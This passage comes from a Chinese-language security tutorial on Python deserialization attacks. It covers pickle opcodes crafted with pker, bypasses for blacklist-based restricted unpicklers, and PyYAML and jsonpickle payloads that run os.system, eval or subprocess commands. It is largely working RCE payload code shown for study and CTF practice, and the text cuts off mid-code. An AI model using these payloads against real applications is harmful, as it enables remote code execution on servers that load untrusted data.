class="number">14</span>)</span><br><span class="line">   <span class="number">27</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">30</span>: R    REDUCE</span><br><span class="line">   <span class="number">31</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">34</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看见opcode第一行导入的是一个<code>os system</code>，这是Linux上的。如果想要在Windows上面使用的话，就得导入<code>nt system</code>模块。如果要避免这种限制需要使用通过AST来构造opcode。<a href="https://github.com/eddieivan01/pker">下载</a> <a href="https://github.com/Ascotbe/Image/blob/master/CodeAudit/Python/pker.zip">备份</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># text.txt</span></span><br><span class="line"><span class="comment"># 重载了__import__ os，不然如果使用安全函数是无法自动导入包的</span></span><br><span class="line">os = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">system = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)(os, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>输入命令<code>python3 pker.py &lt; text.txt</code>即可生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&quot;c__builtin__\n__import__\n(S&#x27;os&#x27;\ntRp0\n0c__builtin__\ngetattr\n(g0\nS&#x27;system&#x27;\ntRp1\n0g1\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure><p>利用<code>pickletools.dis()</code>转换一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__builtin__ __import__&#x27;</span></span><br><span class="line">   <span class="number">24</span>: (    MARK</span><br><span class="line">   <span class="number">25</span>: S        STRING     <span class="string">&#x27;os&#x27;</span></span><br><span class="line">   <span class="number">31</span>: t        TUPLE      (MARK at <span class="number">24</span>)</span><br><span class="line">   <span class="number">32</span>: R    REDUCE</span><br><span class="line">   <span class="number">33</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">36</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">37</span>: c    GLOBAL     <span class="string">&#x27;__builtin__ getattr&#x27;</span></span><br><span class="line">   <span class="number">58</span>: (    MARK</span><br><span class="line">   <span class="number">59</span>: g        GET        <span class="number">0</span></span><br><span class="line">   <span class="number">62</span>: S        STRING     <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">72</span>: t        TUPLE      (MARK at <span class="number">58</span>)</span><br><span class="line">   <span class="number">73</span>: R    REDUCE</span><br><span class="line">   <span class="number">74</span>: p    PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">77</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">78</span>: g    GET        <span class="number">1</span></span><br><span class="line">   <span class="number">81</span>: (    MARK</span><br><span class="line">   <span class="number">82</span>: S        STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">92</span>: t        TUPLE      (MARK at <span class="number">81</span>)</span><br><span class="line">   <span class="number">93</span>: R    REDUCE</span><br><span class="line">   <span class="number">94</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>上面内容简化下就和上面第一个结构体一样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>pker语句就是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 未使用安全重载语句的代码会自动import os这个包，所以不需要__builtin__.__import__ 去导入</span></span><br><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p><code>i</code>操作符</p></div><p>pker语句</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br></pre></td></tr></table></figure><div class="note success modern"><p><code>o</code>操作符</p></div><p>pker语句</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;whoami&#x27;</span>) </span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">o.</span><br></pre></td></tr></table></figure><p>上面这三种都是直接去调用os模块，没有用<code>__builtin__.__import__</code> 去导入，这是因为上面已经提到了<code>pickle.loads</code>会解决import问题，整个python标准库的模块函数均可以使用。</p><div class="note success modern"><p><code>c</code>操作符</p></div><p>其实c操作符是基于<code>find_class(moudle, name)</code>来实现的，<code>find_class()</code>函数实现的功能简单来说就是：去<code>moudle</code>模块中找到<code>name</code>，然后对内存原始的数据进行覆盖。<strong>但是需要注意的是，moudle必须在name的顶层。</strong></p><p>举个🌰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">name = <span class="string">&#x27;jnzm4x8vgb&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;cnqbio0yxa9htwkev61ps&#125;&#x27;</span></span><br><span class="line">sign = <span class="string">&#x27;gy3z9urcn2as7f05ot8b&#x27;</span></span><br><span class="line"><span class="comment"># c_flag.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pickle_test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,sign</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.sign = sign</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> pickle_test <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sign == other.sign</span><br><span class="line"></span><br><span class="line">ser = base64.b64decode(<span class="built_in">input</span>(<span class="string">&quot;input:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ser)</span><br><span class="line"><span class="comment"># 过滤R操作符，防止危险函数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> ser:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = pickle.loads(ser)</span><br><span class="line">    correct = ((result == pickle_test(secret.name, secret.sign)))</span><br><span class="line">    <span class="keyword">if</span> correct:</span><br><span class="line">        <span class="built_in">print</span>(secret.flag)</span><br></pre></td></tr></table></figure><p>直接使用pkel进行生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">admin = GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">admin.name = <span class="string">&quot;test_name&quot;</span></span><br><span class="line">admin.sign = <span class="string">&quot;123456&quot;</span></span><br><span class="line">pickle_test = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;pickle_test&#x27;</span>,<span class="string">&#x27;test_name&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> pickle_test</span><br></pre></td></tr></table></figure><p>然后把结果进行base64下，必须使用python的来编码，因为数据类型是字节类型，网页上的是字符型编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">code=<span class="string">b&quot;c__main__\nsecret\np0\n0g0\n(&#125;(S&#x27;name&#x27;\nS&#x27;test_name&#x27;\ndtbg0\n(&#125;(S&#x27;sign&#x27;\nS&#x27;123456&#x27;\ndtb(S&#x27;test_name&#x27;\nS&#x27;123456&#x27;\ni__main__\npickle_test\np3\n0g3\n.&quot;</span></span><br><span class="line"><span class="comment">#print(pickletools.dis(code))</span></span><br><span class="line">a=base64.b64encode(code)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/6.png" alt="image-20221004221948876"></p><div class="note success modern"><p><code>b</code>操作符</p></div><p>对已有的一个类使用__setstate__()方法进行覆盖</p><blockquote><p>当解封时，如果类<strong>定义</strong>了 <a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=pickle#object.__setstate__"><code>__setstate__()</code></a>，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 <strong>dict</strong>。</p></blockquote><p>如果一个类（暂且称之为<code>Test</code>），它原先是没有定义<code>__setstate__</code>方法的，如果我们现在使用<code>&#123;&quot;__setstate__&quot;: os.system&#125;</code>这个字典来初始化<code>test</code>类的对象（<code>b</code>操作符），现在这个对象便具有了<code>__setstate__</code>方法，之后我们再把待执行的命令作为参数（以<code>whoami</code>为例），再次使用<code>b</code>操作符来执行<code>BUILD</code>指令，由于此时对象存在<code>__setstate__</code>方法，所以便会执行<code>os.system(&#39;whoami&#39;)</code>，成功实现了RCE。</p><p>构建代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">date = <span class="string">b&#x27;c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&#x27;</span></span><br><span class="line">pickletools.dis(date)</span><br><span class="line">pickle.loads(date)</span><br></pre></td></tr></table></figure><p>然后返回结果如下，必须有一个类可以使用，并且没有使用<code>__setstate__</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__main__ Test&#x27;</span></span><br><span class="line">   <span class="number">15</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">16</span>: \x81 NEWOBJ</span><br><span class="line">   <span class="number">17</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">18</span>: (    MARK</span><br><span class="line">   <span class="number">19</span>: V        UNICODE    <span class="string">&#x27;__setstate__&#x27;</span>       <span class="comment"># 引入__setstate__</span></span><br><span class="line">   <span class="number">33</span>: c        GLOBAL     <span class="string">&#x27;os system&#x27;</span>          <span class="comment"># 利用c操作码来引入os.system</span></span><br><span class="line">   <span class="number">44</span>: u        SETITEMS   (MARK at <span class="number">18</span>)</span><br><span class="line">   <span class="number">45</span>: b    BUILD                               <span class="comment"># 执行一次BUILD</span></span><br><span class="line">   <span class="number">46</span>: V    UNICODE    <span class="string">&#x27;whoami&#x27;</span>                 <span class="comment"># 引入命令</span></span><br><span class="line">   <span class="number">54</span>: b    BUILD                               <span class="comment"># 再次执行一次，因为已经纯在设置好的__setstate__，所以会照成命令执行</span></span><br><span class="line">   <span class="number">55</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br><span class="line">ascotbe                                         <span class="comment"># 命令执行结果</span></span><br></pre></td></tr></table></figure><div class="note warning modern"><p>重写find_class()：不一定绝对安全</p></div><p>官方给出的安全反序列化是继承了<code>pickle.Pickler</code>类，并重载了<code>find_class</code>方法，父类原本的操作是把module导入<code>sys.module</code>缓存中（并未导入全局或局部作用域），然后getattr取值，所以重载该方法后即可对module和name进行限制，但<code>find_class</code>的限制仅仅是对该函数参数过滤，并没有hook <code>__import__</code>等函数，所以通过<code>eval(&#39;__import__(\&#39;xx\&#39;)&#39;)</code>等即可绕过。</p><p>下面的例子来自于python官方文档，通过白名单来现在函数运行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>而我们做题一般都是遇到使用黑名单来操作的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;builtins&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(</span><br><span class="line">            <span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">restricted_loads(<span class="string">b&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>题目并没有过滤<code>getattr</code>，我们可以通过该方法来获取到<code>builtins</code>下的<code>eval</code>等危险函数，一个常规的思路就是<code>getattar(builtins, &#39;eval&#39;)</code>，利用之前类继承方式来执行代码即可（魔术函数）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR(cbuiltins\nglobals\n(tRVbuiltins\ntRp1\ncbuiltins\ngetattr\n(g1\nVeval\ntR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)\ntR.&quot;</span></span><br></pre></td></tr></table></figure><h4 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h4><p>yaml本身支持强制类型转化，强制转化为str类型就是<code>!!str</code>，五个功能强大的yaml标签，支持转化为指定的python模块，类，方法以及对象实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:module.cls<span class="comment"># module.cls instance  # 能够直接执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>/apply:module.f<span class="comment"># value of f(...)      # 能够直接执行命令 </span></span><br><span class="line">!!python/name:module.name<span class="comment"># module.name          # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/module:package.module<span class="comment"># package.module       # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>:module.cls<span class="comment"># module.cls instance  # 需要特定条件才可以执行命令 </span></span><br></pre></td></tr></table></figure><h5 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML&lt;=5.1"></a>PyYAML&lt;=5.1</h5><p>序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(data)  <span class="comment"># 加载单个YAML配置，作用是将yaml类型数据转化为python对象包括自定义的对象实例、字典、列表等类型数据</span></span><br><span class="line">load(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器有BaseLoader、SafeLoader</span></span><br><span class="line">load_all(data)  <span class="comment"># 加载多个YAML配置</span></span><br><span class="line">load_all(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器</span></span><br></pre></td></tr></table></figure><p>Loader就是用来指定加载器</p><ul><li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li><li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li><li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换（5.1以下默认此加载器，很危险）</li></ul><p>反序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(data)  <span class="comment"># 接收的参数就是python对象包括对象实例、字典、列表等类型数据</span></span><br></pre></td></tr></table></figure><h6 id="五个complex标签的利用"><a href="#五个complex标签的利用" class="headerlink" title="五个complex标签的利用"></a>五个complex标签的利用</h6><div class="note success modern"><p>!!python/object/apply</p></div><p>进入yaml模块源码yaml/constructor.py中，最终进入了<code>find_python_name</code>方法，通过<code>__import__</code>将模块导入进来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)  <span class="comment"># 命令的单双引号加不加都可以</span></span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p>!!python/object/new</p></div><p>原理跟上面一样，最终进入了<code>find_python_name</code>方法，通过<code>__import__</code>将模块导入进来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;!!python/object/new:os.system [whoami]&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p>!!python/object、!!python/module、!!python/name</p></div><p>这三个不能直接执行命令的标签，条件允许其实有其他办法，比如利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件。比如说同级目录下面有两个文件（同一个文件内用法同理）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yaml_test.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>另一个文件里面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/module:yaml_test&quot;</span> )</span><br><span class="line"><span class="comment"># 下面两条exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对。会执行但是执行完会报错。</span></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/object:yaml_test.exp&quot;</span> )</span><br><span class="line">yaml.load(<span class="string">&quot;!!python/name:yaml_test.exp&quot;</span> )</span><br></pre></td></tr></table></figure><p>当然<code>!!python/object/new</code>和<code>!!python/object/apply</code>也可以用这种方式实现利用，同理会执行但是执行完会报错。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:yaml_test.exp &#123;&#125;&#x27;</span> )</span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/new:yaml_test.exp &#123;&#125;&#x27;</span> )</span><br></pre></td></tr></table></figure><p>如果不在同一目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">├── test_file.py</span><br><span class="line">└── uploads</span><br><span class="line">    └── yaml_test.py</span><br></pre></td></tr></table></figure><p>修改下payload，在文件名前加入目录名可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#经过测试只有modle标签可行</span></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/module:uploads.yaml_test&quot;</span> )</span><br></pre></td></tr></table></figure><p><code>!!python/object/new</code>和<code>!!python/object/apply</code>加个目录即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错</span></span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:uploads.exp &#123;&#125;&#x27;</span> )</span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/new:uploads.exp &#123;&#125;&#x27;</span> )</span><br></pre></td></tr></table></figure><h5 id="PyYAML-gt-5-1"><a href="#PyYAML-gt-5-1" class="headerlink" title="PyYAML&gt;5.1"></a>PyYAML&gt;5.1</h5><p>这个版本中更新了一下方法，截止文章编写时PyYAML的最新版本为6，POC都可以使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(data) [works under certain conditions]</span><br><span class="line">load(data, Loader=Loader)</span><br><span class="line">load(data, Loader=UnsafeLoader)</span><br><span class="line">load(data, Loader=FullLoader)</span><br><span class="line">load_all(data) [works under certain condition]</span><br><span class="line">load_all(data, Loader=Loader)</span><br><span class="line">load_all(data, Loader=UnSafeLoader)</span><br><span class="line">load_all(data, Loader=FullLoader)</span><br><span class="line">full_load(data)</span><br><span class="line">full_load_all(data)</span><br><span class="line">unsafe_load(data)</span><br><span class="line">unsafe_load_all(data)</span><br></pre></td></tr></table></figure><p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.py:<span class="number">3</span>: YAMLLoadWarning: calling yaml.load() without Loader=... <span class="keyword">is</span> deprecated, <span class="keyword">as</span> the default Loader <span class="keyword">is</span> unsafe. Please read https:</span><br></pre></td></tr></table></figure><p>针对不同的需要，选择不同的加载器，有以下几种加载器</p><ul><li>BaseConstructor：仅加载最基本的YAML</li><li>SafeConstructor：安全加载Yaml语言的子集，建议用于加载不受信任的输入（safe_load)</li><li>FullConstructor：加载的模块必须位于 <code>sys.modules</code> 中（说明程序已经 import 过了才让加载）。这个是默认的加载器。</li><li>UnsafeConstructor（也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load）</li><li>Constructor：等同于UnsafeConstructor</li></ul><p>Fullloader加载模式的对漏洞利用的限制</p><ol><li><p>如果不执行只是为了单纯导入模块，那么需要<code>sys.modules</code>字典中有我们的模块，否则报错</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python <span class="built_in">object</span></span><br><span class="line">module <span class="string">&#x27;subprocess&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> imported</span><br></pre></td></tr></table></figure></li><li><p>如果要执行，那么<code>sys.modules</code>字典中要有利用模块，并且加载进来的 <code>module.name</code> 必须是一个类而不能是方法，否则就会报错</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python instance</span><br><span class="line">expected a <span class="keyword">class</span>, but found &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></li></ol><div class="note default modern"><p>说人话就是：不在能够自动通过<code>__import__</code>将模块导入进来，需要使用内置函数或魔术函数方式来使用</p></div><p>那我们直接构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tuple(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))</span></span><br><span class="line"><span class="comment"># 变为yaml就是payload_1</span></span><br><span class="line"><span class="comment"># payload_1</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:tuple</span></span><br><span class="line"><span class="string">- !!python/object/new:map</span></span><br><span class="line"><span class="string">  - !!python/name:eval</span></span><br><span class="line"><span class="string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span></span><br><span class="line"><span class="comment"># payload_2</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:type</span></span><br><span class="line"><span class="string">  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]</span></span><br><span class="line"><span class="string">  listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 报错但是执行了</span></span><br><span class="line"><span class="comment"># payload_3</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- !!python/object/new:str</span></span><br><span class="line"><span class="string">    args: []</span></span><br><span class="line"><span class="string">    state: !!python/tuple</span></span><br><span class="line"><span class="string">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">    - !!python/object/new:staticmethod</span></span><br><span class="line"><span class="string">      args: [0]</span></span><br><span class="line"><span class="string">      state:</span></span><br><span class="line"><span class="string">        update: !!python/name:exec</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line"><span class="comment"># payload_4</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- !!python/object/new:yaml.MappingNode</span></span><br><span class="line"><span class="string">  listitems: !!str &#x27;!!python/object/apply:subprocess.Popen [whoami]&#x27;</span></span><br><span class="line"><span class="string">  state:</span></span><br><span class="line"><span class="string">    tag: !!str dummy</span></span><br><span class="line"><span class="string">    value: !!str dummy</span></span><br><span class="line"><span class="string">    extend: !!python/name:yaml.unsafe_load</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br></pre></td></tr></table></figure><h4 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h4><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title 